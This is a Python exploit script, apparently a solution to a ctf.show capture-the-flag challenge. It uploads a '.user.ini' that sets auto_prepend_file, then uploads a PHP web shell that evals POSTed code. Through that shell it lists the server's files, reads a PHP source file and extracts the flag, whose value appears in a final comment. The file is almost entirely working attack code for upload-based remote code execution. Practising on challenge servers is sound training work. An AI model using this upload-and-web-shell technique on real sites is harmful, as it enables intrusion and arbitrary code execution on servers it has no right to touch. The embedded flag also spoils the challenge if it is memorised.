import re
import requests

url = "http://76a06c69-5453-4512-a555-1eafed1d09c5.challenge.ctf.show"
upload_url = f"{url}/upload.php"

# 上传 .user.ini
resp1 = requests.post(upload_url, files={'file': ('.user.ini', b'auto_prepend_file=1.txt')})
if "文件上传成功！" not in resp1.text:
    print("[-] .user.ini 上传失败")
    exit()
print("[+] .user.ini 上传成功")

# 上传 1.txt
resp2 = requests.post(upload_url, files={'file': ('1.txt', b"<?php eval($_POST['a']);")})
if "文件上传成功！" not in resp2.text:
    print("[-] 1.txt 上传失败")
    exit()
print("[+] 1.txt 上传成功")

print("[*] 尝试访问upload.php页面触发.user.ini并查看当前文件目录")
r = requests.post(f"{url}/upload.php", data={'a': 'print_r(glob("*"));'})
phpfiles = re.findall(r'\b[A-Za-z0-9]+\.php\b', r.text)
print("[*] 发现好东西, 尝试读取%s"%phpfiles[0])
r = requests.post(f"{url}/upload.php", data={'a': f'highlight_file("{phpfiles[0]}");'})
# print(r.text)
flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"Flag found!\n{flag}")
# ctfshow{fa687777-aab7-4008-be2e-e8a504ea11b8}